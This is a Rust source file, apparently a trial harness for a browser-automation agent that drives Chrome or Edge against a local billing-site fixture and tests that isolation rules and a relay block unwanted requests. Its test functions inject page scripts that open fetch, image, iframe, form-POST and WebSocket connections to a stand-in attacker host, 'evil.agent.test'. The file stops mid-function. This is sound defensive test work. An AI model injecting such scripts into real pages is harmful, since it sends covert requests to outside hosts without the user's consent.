use std::io::Write;
use std::net::TcpListener;
use std::path::PathBuf;
use std::process::ExitCode;

use r3_web::{
    browser_kind, CANDIDATE, DRIVER_STEPS, ISOLATION_STEPS, RELAY_STEPS, STEPS, WAY_STEPS,
};

#[derive(Default)]
struct Args {
    browser: Option<String>,
    port: Option<u16>,
    runs: Option<u32>,
    step: Option<String>,
    isolation: bool,
    driver: bool,
    relay_rows: bool,
    way_rows: bool,
    round2: bool,
    add_flags: Vec<String>,
    machine: Option<String>,
    repo: Option<PathBuf>,
    scratch: Option<PathBuf>,
    fault: Option<String>,
    mode: Mode,
    added_bytes: Option<u64>,
    out: Option<PathBuf>,
    headed: bool,
    relay: bool,
    routes: bool,
}

#[derive(Default, Clone, Copy, PartialEq, Eq)]
enum Mode {
    #[default]
    Cells,
    Extras,
    Resolver,
    SnapshotPay,
}

fn refuse(cause: &str, detail: &str) -> ExitCode {
    eprintln!("REFUSED {cause}: {detail}");
    ExitCode::from(2)
}

fn parse(argv: &[String]) -> Result<Args, String> {
    let mut a = Args::default();
    let mut i = 0;
    while i < argv.len() {
        let flag = argv[i].as_str();
        let value = argv.get(i + 1).cloned();
        let mut take = || {
            i += 1;
            value.clone().ok_or_else(|| format!("{flag} needs a value"))
        };
        match flag {
            "--candidate" => {
                if take()? != CANDIDATE {
                    return Err("--candidate takes cdp; no other adapter is built".into());
                }
            }
            "--browser" => a.browser = Some(take()?),
            "--port" => {
                a.port = Some(
                    take()?
                        .parse()
                        .ok()
                        .filter(|p| *p > 0 && *p < 65533)
                        .ok_or("--port takes 1 to 65532")?,
                )
            }
            "--runs" => {
                a.runs = Some(
                    take()?
                        .parse()
                        .ok()
                        .filter(|r| *r > 0)
                        .ok_or("--runs takes a count from 1")?,
                )
            }
            "--step" => a.step = Some(take()?),
            "--rows" => match take()?.as_str() {
                "isolation" => a.isolation = true,
                "driver" => a.driver = true,
                "relay" => a.relay_rows = true,
                "ways" => a.way_rows = true,
                _ => return Err("--rows takes isolation, driver, relay or ways".into()),
            },
            "--add-flag" => a.add_flags.push(take()?),
            "--machine" => {
                let m = take()?;
                if !["mac", "hosted-mac", "hosted-win"].contains(&m.as_str()) {
                    return Err("--machine takes mac, hosted-mac or hosted-win".into());
                }
                a.machine = Some(m);
            }
            "--repo" => a.repo = Some(PathBuf::from(take()?)),
            "--scratch" => a.scratch = Some(PathBuf::from(take()?)),
            "--fault" => a.fault = Some(take()?),
            "--added-bytes" => {
                a.added_bytes = Some(take()?.parse().map_err(|_| "--added-bytes takes a count")?)
            }
            "--out" => a.out = Some(PathBuf::from(take()?)),
            "--extras" => a.mode = Mode::Extras,
            "--resolver-probe" => a.mode = Mode::Resolver,
            "--snapshot-pay" => a.mode = Mode::SnapshotPay,
            "--headed" => a.headed = true,
            "--relay" => a.relay = true,
            "--round" => {
                if take()? != "2" {
                    return Err("--round takes 2".into());
                }
                a.round2 = true;
            }
            "--routes" => a.routes = true,
            _ => return Err(format!("unknown argument {flag}")),
        }
        i += 1;
    }
    if a.browser.is_none()
        || a.port.is_none()
        || a.machine.is_none()
        || a.repo.is_none()
        || a.scratch.is_none()
    {
        return Err("--browser, --port, --machine, --repo and --scratch are required".into());
    }
    if a.mode == Mode::Cells && a.runs.is_none() {
        return Err("--runs is required".into());
    }
    if a.mode == Mode::Extras && a.added_bytes.is_none() {
        return Err("--extras needs --added-bytes".into());
    }
    if a.mode == Mode::SnapshotPay && a.out.is_none() {
        return Err("--snapshot-pay needs --out".into());
    }
    if a.fault.is_some() && a.mode != Mode::Cells {
        return Err("--fault runs cells only".into());
    }
    let rows: &[&str] = if a.way_rows {
        &WAY_STEPS
    } else if a.relay_rows {
        &RELAY_STEPS
    } else if a.driver {
        &DRIVER_STEPS
    } else if a.isolation {
        &ISOLATION_STEPS
    } else {
        &STEPS
    };
    if let Some(s) = &a.step {
        if !rows.contains(&s.as_str()) {
            return Err(format!("--step takes one of {}", rows.join(",")));
        }
    }
    if (a.isolation || a.driver) && (a.mode != Mode::Cells || a.fault.is_some()) {
        return Err("--rows isolation and --rows driver run cells with no fault".into());
    }
    if (a.round2 || a.relay_rows || a.way_rows) && !a.relay && !a.driver {
        return Err("--round 2 and --rows relay need --relay".into());
    }
    if (a.relay_rows || a.way_rows) && !a.round2 {
        return Err("--rows relay belongs to --round 2".into());
    }
    if !a.isolation && !a.add_flags.is_empty() {
        return Err("--add-flag belongs to --rows isolation".into());
    }
    Ok(a)
}

fn port_free(port: u16) -> bool {
    TcpListener::bind(("127.0.0.1", port)).is_ok()
}

fn main() -> ExitCode {
    let argv: Vec<String> = std::env::args().skip(1).collect();
    if argv.first().map(String::as_str) == Some("--driver-child") {
        return driver_child(&argv[1..]);
    }
    let args = match parse(&argv) {
        Ok(a) => a,
        Err(e) => return refuse("usage", &e),
    };
    let browser = args.browser.clone().unwrap_or_default();
    let Some(kind) = browser_kind(&browser) else {
        return refuse("browser", "the file name is no Chrome or Edge binary");
    };
    if !std::path::Path::new(&browser).is_file() {
        return refuse("browser", "no file at the path");
    }
    let port = args.port.unwrap_or_default();
    let needed: Vec<u16> = match (&args.fault, args.mode) {
        (Some(_), _) => vec![port, port + 2],
        (None, Mode::Extras) => vec![port, port + 1],
        (None, _) => vec![port],
    };
    if let Some(p) = needed.iter().find(|p| !port_free(**p)) {
        return refuse("port", &format!("127.0.0.1:{p} is taken"));
    }
    run(args, kind)
}

#[cfg(not(feature = "driver"))]
fn driver_child(_argv: &[String]) -> ExitCode {
    ExitCode::from(1)
}

#[cfg(feature = "driver")]
fn driver_child(argv: &[String]) -> ExitCode {
    driver::child_main(argv)
}

#[cfg(not(feature = "driver"))]
fn run(args: Args, _kind: &'static str) -> ExitCode {
    let repo = args.repo.unwrap_or_default();
    let _ = r3_web::fixture::Seed::load(&repo, 1);
    out(&format!("notrun candidate={CANDIDATE} cause=no_driver"));
    ExitCode::from(1)
}

#[cfg(feature = "driver")]
fn run(args: Args, kind: &'static str) -> ExitCode {
    let rt = match tokio::runtime::Builder::new_current_thread()
        .enable_all()
        .build()
    {
        Ok(rt) => rt,
        Err(e) => {
            println!("notrun candidate={CANDIDATE} cause=runtime");
            eprintln!("{e}");
            return ExitCode::from(1);
        }
    };
    rt.block_on(driver::main(args, kind))
}

#[cfg(feature = "driver")]
mod driver {
    use std::path::{Path, PathBuf};
    use std::process::ExitCode;
    use std::time::{Duration, Instant};

    use futures::StreamExt;
    use r3_web::cdp::host_of;
    use r3_web::cdp::{
        Executor, Fault, Locator, Outcome, PausedRequest, Res, Resolved, SnapshotLine, StartOptions,
    };
    use r3_web::fixture::{count, fixture_program, origin, Control, Seed, Server, PAY, UTILITY};
    use r3_web::pipe::PipeBrowser;
    use r3_web::relay::{relay_flags, HostPort, Relay, RelayHandle};
    use r3_web::tls::{make_certificate, openssl_runs, CertFault, Listener};
    use r3_web::{
        extract_amount, major_of, median, variants_of, CANDIDATE, FIRST_FLAGS, ISOLATION_STEPS,
        RELAY_STEPS, RESOLVER_RULE, ROUND2_FLAGS, STEPS, WAY_STEPS, WS_POLICY,
    };

    use super::{out, Args, Mode};

    #[derive(Clone)]
    pub struct Stop(tokio::sync::watch::Receiver<bool>);

    impl Stop {
        fn is_set(&self) -> bool {
            *self.0.borrow()
        }

        async fn wait(&self) {
            let mut rx = self.0.clone();
            if rx.wait_for(|stopped| *stopped).await.is_err() {
                std::future::pending::<()>().await;
            }
        }

        async fn or<T>(&self, work: impl std::future::Future<Output = Res<T>>) -> Res<T> {
            tokio::select! {
                biased;
                _ = self.wait() => Err(Fault::new("signal", "stopped")),
                r = work => r,
            }
        }
    }

    fn watch_signals() -> std::io::Result<Stop> {
        let (tx, rx) = tokio::sync::watch::channel(false);
        #[cfg(unix)]
        {
            use tokio::signal::unix::{signal, SignalKind};
            let mut term = signal(SignalKind::terminate())?;
            let mut int = signal(SignalKind::interrupt())?;
            tokio::spawn(async move {
                tokio::select! {
                    _ = term.recv() => {}
                    _ = int.recv() => {}
                }
                let _ = tx.send(true);
            });
        }
        #[cfg(not(unix))]
        {
            let mut c = tokio::signal::windows::ctrl_c()?;
            let mut b = tokio::signal::windows::ctrl_break()?;
            tokio::spawn(async move {
                tokio::select! {
                    _ = c.recv() => {}
                    _ = b.recv() => {}
                }
                let _ = tx.send(true);
            });
        }
        Ok(Stop(rx))
    }

    pub struct Ctx {
        browser: PathBuf,
        kind: &'static str,
        machine: String,
        port: u16,
        control: Control,
        seed: Seed,
        scratch: PathBuf,
        headless: bool,
        stop: Stop,
        added_flags: Vec<String>,
        routes: bool,
        relayed: bool,
        round2: bool,
        relay: Option<RelayHandle>,
        repo: PathBuf,
    }

    impl Ctx {
        fn flags(&self) -> Vec<String> {
            let mut f: Vec<String> = FIRST_FLAGS.iter().map(|s| s.to_string()).collect();
            f.push(RESOLVER_RULE.to_string());
            f.extend(self.added_flags.iter().cloned());
            f
        }

        fn options(&self, profile: &str, debug_port: Option<u16>) -> StartOptions {
            StartOptions {
                browser: self.browser.clone(),
                profile: self
                    .scratch
                    .join(format!("{}-{profile}", std::process::id())),
                headless: self.headless,
                flags: self.flags(),
                debug_port,
            }
        }

        fn u(&self, path: &str) -> String {
            format!("{}{path}", origin(UTILITY, self.port))
        }
    }

    fn check(cond: bool, name: &'static str) -> Res<()> {
        if cond {
            Ok(())
        } else {
            Err(Fault::new("check", name))
        }
    }

    fn state(ctx: &Ctx) -> Res<serde_json::Value> {
        ctx.control.state().map_err(|e| Fault::new("control", e))
    }

    fn counter(ctx: &Ctx, path: &[&str]) -> Res<i64> {
        count(&state(ctx)?, path).ok_or_else(|| Fault::new("check", "state_key"))
    }

    fn role(r: &'static str, name: &str) -> Locator {
        Locator::Role(r, name.to_string())
    }

    async fn path_now(ex: &Executor) -> Res<String> {
        let main = ex.main_frame().await?;
        Ok(r3_web::cdp::split_url(&ex.frame_url(&main).await?).1)
    }

    async fn click_and_wait(ex: &mut Executor, reference: &str) -> Res<()> {
        let frame = ex.frame_of(reference).await?;
        let before = ex.loader(&frame).await?;
        ex.click(reference).await?;
        ex.wait_loaded_after(&frame, Some(&before)).await
    }

    async fn signin(ex: &mut Executor, ctx: &Ctx) -> Res<()> {
        ex.open(&ctx.u("/signin")).await?;
        submit_signin(ex, ctx).await
    }

    async fn submit_signin(ex: &mut Executor, ctx: &Ctx) -> Res<()> {
        let email = ex.resolve_one(&[role("textbox", "Email")], &[]).await?;
        ex.fill(&email, &ctx.seed.str(&["credentials", "user"]))
            .await?;
        let pw = ex.resolve_one(&[role("textbox", "Password")], &[]).await?;
        ex.fill(&pw, &ctx.seed.str(&["credentials", "password"]))
            .await?;
        let button = ex.resolve_one(&[role("button", "Sign in")], &[]).await?;
        click_and_wait(ex, &button).await
    }

    async fn signin_form(ex: &mut Executor, ctx: &Ctx) -> Res<()> {
        let before = counter(ctx, &["utility", "signins"])?;
        signin(ex, ctx).await?;
        let after = counter(ctx, &["utility", "signins"])?;
        check(after == before + 1, "signins")?;
        check(path_now(ex).await? == "/bill", "page")
    }

    async fn table_read(ex: &mut Executor, ctx: &Ctx) -> Res<()> {
        signin(ex, ctx).await?;
        check(path_now(ex).await? == "/bill", "page")?;
        let lines = ex.table("Bill history").await?;
        let cells: Vec<&SnapshotLine> = lines.iter().filter(|l| l.role == "cell").collect();
        let history = ctx.seed.0["utility"]["history"]
            .as_array()
            .cloned()
            .unwrap_or_default();
        check(history.len() == 3 && cells.len() == 9, "cells")?;
        for (row, h) in cells.chunks(3).zip(history.iter()) {
            check(row[0].name == h["date"].as_str().unwrap_or("-"), "date")?;
            check(
                extract_amount(&row[1].name) == h["amount"].as_u64(),
                "amount",
            )?;
            check(row[2].name == h["status"].as_str().unwrap_or("-"), "status")?;
        }
        Ok(())
    }

    async fn watch_requests(ex: &mut Executor, ctx: &Ctx) -> Res<()> {
        ex.arm_rule(vec![origin(UTILITY, ctx.port), origin(PAY, ctx.port)], true)
            .await
    }

    fn sent(ex: &Executor, method: &str, path: &str) -> Res<PausedRequest> {
        let mut found: Vec<PausedRequest> = ex
            .paused()
            .into_iter()
            .filter(|p| p.method == method && p.path == path && p.outcome == Outcome::Continued)
            .collect();
        match found.len() {
            1 => Ok(found.remove(0)),
            0 => Err(Fault::new("check", "request_not_sent")),
            _ => Err(Fault::new("check", "request_sent_twice")),
        }
    }

    async fn form_fill(ex: &mut Executor, ctx: &Ctx) -> Res<()> {
        signin(ex, ctx).await?;
        ex.open(&ctx.u("/prefs")).await?;
        watch_requests(ex, ctx).await?;
        let before = counter(ctx, &["utility", "prefs_saved"])?;
        let boxed = ex
            .resolve_one(&[role("checkbox", "Paperless billing")], &[])
            .await?;
        ex.click(&boxed).await?;
        let save = ex
            .resolve_one(&[role("button", "Save preferences")], &[])
            .await?;
        click_and_wait(ex, &save).await?;
        let after = counter(ctx, &["utility", "prefs_saved"])?;
        check(after == before + 1, "prefs_saved")?;
        let post = sent(ex, "POST", "/prefs")?;
        check(post.body_holds(b"paperless=yes"), "box_set_in_request")
    }

    fn payments(ctx: &Ctx) -> Res<Vec<serde_json::Value>> {
        state(ctx)?["utility"]["payments"]
            .as_array()
            .cloned()
            .ok_or_else(|| Fault::new("check", "state_key"))
    }

    fn paid_once_more(ctx: &Ctx, before: usize, instrument: &str) -> Res<()> {
        let after = payments(ctx)?;
        check(after.len() == before + 1, "payments")?;
        let last = after.last().cloned().unwrap_or_default();
        check(
            last["amount"] == ctx.seed.0["utility"]["amount_due"],
            "amount",
        )?;
        check(last["instrument"] == instrument, "instrument")
    }

    fn instrument(ctx: &Ctx, index: usize) -> String {
        ctx.seed.0["utility"]["instruments"][index]
            .as_str()
            .unwrap_or("-")
            .to_string()
    }

    fn method_line(lines: &[SnapshotLine]) -> Res<usize> {
        lines
            .iter()
            .position(|l| l.role == "combobox" && l.name == "Payment method")
            .ok_or_else(|| Fault::new("resolve", "combobox"))
    }

    async fn payment_frame(ex: &mut Executor, ctx: &Ctx) -> Res<()> {
        signin(ex, ctx).await?;
        ex.open(&ctx.u("/pay")).await?;
        let before = payments(ctx)?.len();
        let lines = ex.snapshot().await?;
        let combo = method_line(&lines)?;
        let second = lines[combo + 1..]
            .iter()
            .take_while(|l| l.role == "option")
            .nth(1)
            .map(|l| l.name.clone())
            .ok_or_else(|| Fault::new("resolve", "option"))?;
        check(
            lines[combo].value.as_deref() != Some(second.as_str()),
            "second_not_chosen_yet",
        )?;
        let method = ex
            .resolve_one(&[role("combobox", "Payment method")], &["Payment"])
            .await?;
        ex.select(&method, &second).await?;
        let after = ex.snapshot().await?;
        check(
            after[method_line(&after)?].value.as_deref() == Some(second.as_str()),
            "selected",
        )?;
        let pay = ex
            .resolve_one(&[role("button", "Pay now")], &["Payment"])
            .await?;
        click_and_wait(ex, &pay).await?;
        let heading = ex
            .resolve(&[role("heading", "Payment received")], &["Payment"])
            .await?;
        check(matches!(heading, Resolved::One { .. }), "heading")?;
        paid_once_more(ctx, before, &second)?;
        check(second == instrument(ctx, 1), "second_option")
    }

    async fn file_upload(ex: &mut Executor, ctx: &Ctx, i: u32) -> Res<()> {
        signin(ex, ctx).await?;
        ex.open(&ctx.u("/upload")).await?;
        let file = ctx.scratch.join(format!("meter-{i}.bin"));
        std::fs::write(&file, vec![0x5a_u8; 1024])
            .map_err(|e| Fault::new("file", e.to_string()))?;
        let before = counter(ctx, &["utility", "uploads"])?;
        let input = ex
            .resolve_one(
                &[
                    Locator::TestId("meter-photo".into()),
                    role("button", "Meter photo"),
                ],
                &[],
            )
            .await?;
        ex.upload(&input, &file).await?;
        check(ex.file_sizes(&input).await? == vec![1024], "file_in_input")?;
        watch_requests(ex, ctx).await?;
        let send = ex.resolve_one(&[role("button", "Upload")], &[]).await?;
        click_and_wait(ex, &send).await?;
        let after = counter(ctx, &["utility", "uploads"])?;
        check(after == before + 1, "uploads")?;
        sent(ex, "POST", "/upload").map(|_| ())
    }

    async fn session_expiry(ex: &mut Executor, ctx: &Ctx) -> Res<()> {
        signin(ex, ctx).await?;
        let signins = counter(ctx, &["utility", "signins"])?;
        check(signins == 1, "first_signin")?;
        ex.open(&ctx.u("/prefs")).await?;
        let save = ex
            .resolve_one(&[role("button", "Save preferences")], &[])
            .await?;
        click_and_wait(ex, &save).await?;
        check(
            counter(ctx, &["utility", "prefs_saved"])? == 1,
            "prefs_saved",
        )?;
        ex.open(&ctx.u("/bill")).await?;
        let lines = ex.snapshot().await?;
        check(lines.iter().any(|l| l.credential), "credential_field")?;
        check(counter(ctx, &["utility", "signins"])? == 1, "signins")
    }

    async fn changed_page_1(ex: &mut Executor, ctx: &Ctx) -> Res<()> {
        signin(ex, ctx).await?;
        ex.open(&ctx.u("/pay")).await?;
        let before = payments(ctx)?.len();
        let found = ex
            .resolve(
                &[Locator::TestId("pay-now".into()), role("button", "Pay now")],
                &["Payment"],
            )
            .await?;
        let Resolved::One { reference, locator } = found else {
            return Err(Fault::new("resolve", "none"));
        };
        check(locator == 1, "second_locator")?;
        click_and_wait(ex, &reference).await?;
        paid_once_more(ctx, before, &instrument(ctx, 0))
    }

    async fn block_request(ex: &mut Executor, ctx: &Ctx) -> Res<()> {
        signin(ex, ctx).await?;
        ex.open(&ctx.u("/prefs")).await?;
        let u = origin(UTILITY, ctx.port);
        ex.arm_rule(vec![u.clone(), origin(PAY, ctx.port)], false)
            .await?;
        let before = counter(ctx, &["requests", "state_changing"])?;
        let save = ex
            .resolve_one(&[role("button", "Save preferences")], &[])
            .await?;
        let main = ex.main_frame().await?;
        ex.click(&save).await?;
        let deadline = Instant::now() + r3_web::cdp::STEP_TIMEOUT;
        let failed = loop {
            if let Some(p) = ex.paused().into_iter().find(|p| !p.let_through) {
                break p;
            }
            if Instant::now() > deadline {
                return Err(Fault::new("timeout", "paused"));
            }
            tokio::time::sleep(Duration::from_millis(50)).await;
        };
        check(failed.method == "POST", "method")?;
        check(failed.origin == u, "origin")?;
        check(failed.path == "/prefs", "path")?;
        check(failed.outcome == Outcome::Failed, "failed_by_browser")?;
        loop {
            if ex.frame_url(&main).await?.starts_with("chrome-error://") {
                break;
            }
            if Instant::now() > deadline {
                return Err(Fault::new("timeout", "error_page"));
            }
            tokio::time::sleep(Duration::from_millis(50)).await;
        }
        let after = counter(ctx, &["requests", "state_changing"])?;
        check(after == before, "state_changing")
    }

    fn mark(lines: &[SnapshotLine], name: &str) -> Option<bool> {
        lines
            .iter()
            .find(|l| l.role == "textbox" && l.name == name)
            .map(|l| l.credential)
    }

    async fn credential_mark(ex: &mut Executor, ctx: &Ctx) -> Res<()> {
        ex.open(&ctx.u("/signin")).await?;
        let signin_page = ex.snapshot().await?;
        check(mark(&signin_page, "Email") == Some(false), "email")?;
        check(mark(&signin_page, "Password") == Some(true), "password")?;
        submit_signin(ex, ctx).await?;
        check(path_now(ex).await? == "/challenge", "challenge_page")?;
        let challenge = ex.snapshot().await?;
        check(mark(&challenge, "Characters") == Some(true), "characters")?;
        let field = ex
            .resolve_one(&[role("textbox", "Characters")], &[])
            .await?;
        ex.fill(&field, &ctx.seed.str(&["credentials", "captcha"]))
            .await?;
        let go = ex.resolve_one(&[role("button", "Continue")], &[]).await?;
        click_and_wait(ex, &go).await?;
        check(path_now(ex).await? == "/verify", "verify_page")?;
        let verify = ex.snapshot().await?;
        check(
            mark(&verify, "Verification code") == Some(true),
            "verification_code",
        )
    }

    async fn pay_frame_target(ex: &Executor, ctx: &Ctx) -> Res<String> {
        let frame = format!("{}/", origin(PAY, ctx.port));
        let mut targets: Vec<String> = ex
            .frame_targets()
            .await?
            .into_iter()
            .filter(|(_, url)| url.starts_with(&frame))
            .map(|(id, _)| id)
            .collect();
        match targets.len() {
            1 => Ok(targets.remove(0)),
            _ => Err(Fault::new("check", "frame_not_own_target")),
        }
    }

    async fn frame_isolated(ex: &Executor, ctx: &Ctx) -> Res<()> {
        pay_frame_target(ex, ctx).await.map(|_| ())
    }

    async fn payment_frame_isolated(ex: &mut Executor, ctx: &Ctx) -> Res<()> {
        payment_frame(ex, ctx).await?;
        frame_isolated(ex, ctx).await
    }

    async fn changed_page_1_isolated(ex: &mut Executor, ctx: &Ctx) -> Res<()> {
        changed_page_1(ex, ctx).await?;
        frame_isolated(ex, ctx).await
    }

    type Key = (&'static str, &'static [&'static str]);

    const STATE_CHANGING: Key = ("state_changing", &["requests", "state_changing"]);
    const PREFS_SAVED: Key = ("prefs_saved", &["utility", "prefs_saved"]);
    const PAYMENTS: Key = ("payments", &["utility", "payments"]);
    const EVIL: Key = ("evil", &["requests", "evil"]);

    fn read_counters(ctx: &Ctx, keys: &[Key]) -> Res<Vec<i64>> {
        let s = state(ctx)?;
        keys.iter()
            .map(|(name, path)| {
                count(&s, path).ok_or_else(|| Fault::new("check", format!("state_key_{name}")))
            })
            .collect()
    }

    async fn arm_isolation_rule(ex: &mut Executor, ctx: &Ctx) -> Res<()> {
        ex.arm_rule(
            vec![origin(UTILITY, ctx.port), origin(PAY, ctx.port)],
            false,
        )
        .await
    }

    async fn paused_after(
        ex: &Executor,
        t0: Instant,
        want: impl Fn(&PausedRequest) -> bool,
    ) -> Option<(PausedRequest, u128)> {
        let deadline = t0 + r3_web::cdp::STEP_TIMEOUT;
        loop {
            if let Some(p) = ex.paused().into_iter().find(|p| want(p)) {
                return Some((p, t0.elapsed().as_millis()));
            }
            if Instant::now() > deadline {
                return None;
            }
            tokio::time::sleep(Duration::from_millis(50)).await;
        }
    }

    async fn held(
        ctx: &Ctx,
        keys: &[Key],
        before: &[i64],
        seen: Option<(PausedRequest, u128)>,
    ) -> Res<Option<u128>> {
        tokio::time::sleep(Duration::from_millis(2_000)).await;
        let second = read_counters(ctx, keys)?;
        let third = read_counters(ctx, keys)?;
        let mut misses: Vec<&str> = Vec::new();
        match &seen {
            None => misses.push("paused_none"),
            Some((p, _)) => {
                if p.let_through {
                    misses.push("let_through");
                }
                if p.outcome != Outcome::Failed {
                    misses.push("not_failed");
                }
            }
        }
        for (i, (name, _)) in keys.iter().enumerate() {
            if second[i] != before[i] || third[i] != before[i] {
                misses.push(name);
            }
        }
        if misses.is_empty() {
            Ok(seen.map(|(_, ms)| ms))
        } else {
            Err(Fault::new("check", misses.join(".")))
        }
    }

    const POPUP_SCRIPT: &str = r#"(() => { const f = document.querySelector('form[action="/prefs"]'); if (!f) return false; f.target = '_blank'; return true; })()"#;

    async fn block_popup(ex: &mut Executor, ctx: &Ctx) -> Res<Option<u128>> {
        signin(ex, ctx).await?;
        arm_isolation_rule(ex, ctx).await?;
        ex.open(&ctx.u("/prefs")).await?;
        let changed = ex.run_page_script(POPUP_SCRIPT).await?;
        check(changed == serde_json::Value::Bool(true), "script")?;
        let keys = [STATE_CHANGING, PREFS_SAVED];
        let before = read_counters(ctx, &keys)?;
        let boxed = ex
            .resolve_one(&[role("checkbox", "Paperless billing")], &[])
            .await?;
        ex.click(&boxed).await?;
        let save = ex
            .resolve_one(&[role("button", "Save preferences")], &[])
            .await?;
        let u = origin(UTILITY, ctx.port);
        let main = ex.main_frame().await?;
        let t0 = Instant::now();
        ex.click(&save).await?;
        let seen = paused_after(ex, t0, |p| {
            p.method == "POST" && p.origin == u && p.path == "/prefs" && p.frame != *main.inner()
        })
        .await;
        held(ctx, &keys, &before, seen).await
    }

    async fn block_frame_post(ex: &mut Executor, ctx: &Ctx) -> Res<Option<u128>> {
        signin(ex, ctx).await?;
        arm_isolation_rule(ex, ctx).await?;
        ex.open(&ctx.u("/pay")).await?;
        let pay_frame = pay_frame_target(ex, ctx).await?;
        let keys = [STATE_CHANGING, PAYMENTS];
        let before = read_counters(ctx, &keys)?;
        let pay = ex
            .resolve_one(&[role("button", "Pay now")], &["Payment"])
            .await?;
        let p_origin = origin(PAY, ctx.port);
        let t0 = Instant::now();
        ex.click(&pay).await?;
        let seen = paused_after(ex, t0, |p| {
            p.method == "POST"
                && p.origin == p_origin
                && p.path == "/charge"
                && p.frame == pay_frame
        })
        .await;
        held(ctx, &keys, &before, seen).await
    }

    fn socket_script(port: u16) -> String {
        format!(
            "(() => {{ globalThis.halvoTrialSocket = new WebSocket(\"ws://evil.agent.test:{port}/\"); return true; }})()"
        )
    }

    async fn block_websocket(ex: &mut Executor, ctx: &Ctx) -> Res<Option<u128>> {
        if ctx.round2 {
            return block_websocket_at_relay(ex, ctx).await;
        }
        signin(ex, ctx).await?;
        arm_isolation_rule(ex, ctx).await?;
        ex.open(&ctx.u("/bill")).await?;
        let keys = [EVIL];
        let before = read_counters(ctx, &keys)?;
        let t0 = Instant::now();
        let ran = ex.run_page_script(&socket_script(ctx.port)).await?;
        check(ran == serde_json::Value::Bool(true), "script")?;
        let seen = paused_after(ex, t0, |p| {
            host_of(&p.origin) == "evil.agent.test" && p.path == "/"
        })
        .await;
        held(ctx, &keys, &before, seen).await
    }

    async fn cert_error(ex: &mut Executor, ctx: &Ctx, i: u32) -> Res<Option<u128>> {
        let dir = ctx.scratch.join(format!("{}-cert-{i}", std::process::id()));
        let (cert, key) = make_certificate(&dir).map_err(|e| match e {
            CertFault::NoOpenssl => Fault::new("openssl", "no openssl"),
            CertFault::Failed(d) => Fault::new("certificate", d),
        })?;
        let program = ctx.repo.join("tools/r3-trials/web/tls-listener.mjs");
        let mut listener =
            Listener::start_tls(&program, &cert, &key).map_err(|e| Fault::new("listener", e))?;
        if let Some(r) = &ctx.relay {
            r.allow(UTILITY, listener.port);
        }
        let address = format!("https://{UTILITY}:{}/", listener.port);
        let opened = ex.navigate_error(&address).await;
        let counts = listener.counts().map_err(|e| Fault::new("listener", e));
        listener.stop();
        let error = opened?;
        let counts = counts?;
        let mut misses: Vec<&str> = Vec::new();
        if !error.as_deref().unwrap_or("").starts_with("net::ERR_CERT_") {
            misses.push("no_certificate_error");
        }
        if counts.requests != 0 {
            misses.push("request_counted");
        }
        if misses.is_empty() {
            Ok(None)
        } else {
            Err(Fault::new("check", misses.join(".")))
        }
    }

    fn fixture_list(ctx: &Ctx) -> Vec<HostPort> {
        vec![(UTILITY.to_string(), ctx.port), (PAY.to_string(), ctx.port)]
    }

    fn relay_of(ctx: &Ctx) -> Res<RelayHandle> {
        ctx.relay
            .clone()
            .ok_or_else(|| Fault::new("relay", "no relay"))
    }

    async fn refused_after(relay: &RelayHandle, host: &str, port: u16, before: usize) -> bool {
        let deadline = Instant::now() + Duration::from_secs(5);
        loop {
            if relay.refusals_of(host, port) > before {
                return true;
            }
            if Instant::now() > deadline {
                return false;
            }
            tokio::time::sleep(Duration::from_millis(50)).await;
        }
    }

    async fn alive(ex: &Executor) -> bool {
        matches!(
            ex.run_page_script("document.readyState").await,
            Ok(serde_json::Value::String(_))
        )
    }

    fn outcome(misses: Vec<String>, ms: Option<u128>) -> Res<Option<u128>> {
        if misses.is_empty() {
            Ok(ms)
        } else {
            Err(Fault::new("check", misses.join(".")))
        }
    }

    async fn block_websocket_at_relay(ex: &mut Executor, ctx: &Ctx) -> Res<Option<u128>> {
        let relay = relay_of(ctx)?;
        signin(ex, ctx).await?;
        arm_isolation_rule(ex, ctx).await?;
        ex.open(&ctx.u("/bill")).await?;
        let keys = [EVIL];
        let before = read_counters(ctx, &keys)?;
        let refused = relay.refusals_of("evil.agent.test", ctx.port);
        let t0 = Instant::now();
        let ran = ex.run_page_script(&socket_script(ctx.port)).await?;
        check(ran == serde_json::Value::Bool(true), "script")?;
        let mut misses = Vec::new();
        let seen = refused_after(&relay, "evil.agent.test", ctx.port, refused).await;
        let ms = t0.elapsed().as_millis();
        if !seen {
            misses.push("refusal_none".to_string());
        }
        tokio::time::sleep(Duration::from_millis(2_000)).await;
        let second = read_counters(ctx, &keys)?;
        let third = read_counters(ctx, &keys)?;
        if second != before || third != before {
            misses.push("evil".to_string());
        }
        if !alive(ex).await {
            misses.push("ended".to_string());
        }
        outcome(misses, Some(ms))
    }

    async fn list_refuse(ex: &mut Executor, ctx: &Ctx) -> Res<Option<u128>> {
        let relay = relay_of(ctx)?;
        ex.open(&ctx.u("/bill")).await?;
        let keys = [EVIL];
        let before = read_counters(ctx, &keys)?;
        let e = format!("evil.agent.test:{}", ctx.port);
        let kinds = [
            ("document", "(() => { const f = document.createElement('iframe'); f.src = 'http://EVIL_HOST/doc'; document.body.appendChild(f); return true; })()"),
            ("fetch", "(() => { fetch('http://EVIL_HOST/fetch', { mode: 'no-cors' }).catch(() => {}); return true; })()"),
            ("image", "(() => { new Image().src = 'http://EVIL_HOST/img'; return true; })()"),
            ("form", "(() => { const i = document.createElement('iframe'); i.name = 'halvoSink'; document.body.appendChild(i); const f = document.createElement('form'); f.method = 'post'; f.action = 'http://EVIL_HOST/form'; f.target = 'halvoSink'; document.body.appendChild(f); f.submit(); return true; })()"),
            ("ws", "(() => { new WebSocket('ws://EVIL_HOST/'); return true; })()"),
            ("wss", "(() => { new WebSocket('wss://EVIL_HOST/'); return true; })()"),
        ];
        let mut misses = Vec::new();
        for (kind, script) in kinds {
            let n0 = relay.refusals_of("evil.agent.test", ctx.port);
            let ran = ex.run_page_script(&script.replace("EVIL_HOST", &e)).await;
            if ran.is_err() || !refused_after(&relay, "evil.agent.test", ctx.port, n0).await {
                misses.push(format!("refusal_{kind}"));
            }
        }
        tokio::time::sleep(Duration::from_millis(2_000)).await;
        if read_counters(ctx, &keys)? != before {
            misses.push("evil".to_string());
        }
        if !alive(ex).await {
            misses.push("ended".to_string());
        }
        outcome(misses, None)
    }

    fn chain_listener(ctx: &Ctx) -> Res<Listener> {
        Listener::start_chain(&ctx.repo.join("tools/r3-trials/web/chain-listener.mjs"))
            .map_err(|e| Fault::new("listener", e))
    }

    async fn list_hops(ex: &mut Executor, ctx: &Ctx) -> Res<Option<u128>> {
        let relay = relay_of(ctx)?;
        let mut listener = chain_listener(ctx)?;
        let l = listener.port;
